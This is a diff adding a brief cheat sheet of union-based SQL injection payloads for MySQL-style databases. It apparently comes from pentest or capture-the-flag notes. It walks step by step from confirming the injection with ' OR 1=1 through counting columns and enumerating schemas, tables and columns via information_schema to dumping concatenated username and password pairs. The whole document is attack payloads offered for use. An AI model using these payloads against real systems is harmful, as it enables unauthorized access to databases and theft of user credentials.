@@ -1,0 +1,45 @@
+Confirm SQLi
+```
+' OR 1=1-- -
+```
+
+Find number of columns
+```
+'UNION SELECT 1,2,3,4,5,6-- -
+```
+
+Find reflected column
+```
+' UNION SELECT 1,2,database(),4,5,6-- -
+```
+
+Find version
+```
+' UNION SELECT 1,2,3,4,5,@@version-- -
+```
+
+Current user
+```
+user()
+```
+
+List database
+```
+' UNION SELECT 1,2,3,4,schema_name,6 FROM information_schema.schemata-- -
+```
+
+List table
+```
+' UNION SELECT 1,2,3,4,table_name,6 FROM information_schema.tables WHERE table_schema='users'-- -
+```
+
+List columns
+```
+SELECT column_name FROM information_schema.columns WHERE table_name='table'
+```
+
+Dump data
+```
+' UNION SELECT 1,2,3,4,concat(username,':',password),6 FROM users.UserDetails-- -
+```
+- Concat may not always work so try individually 
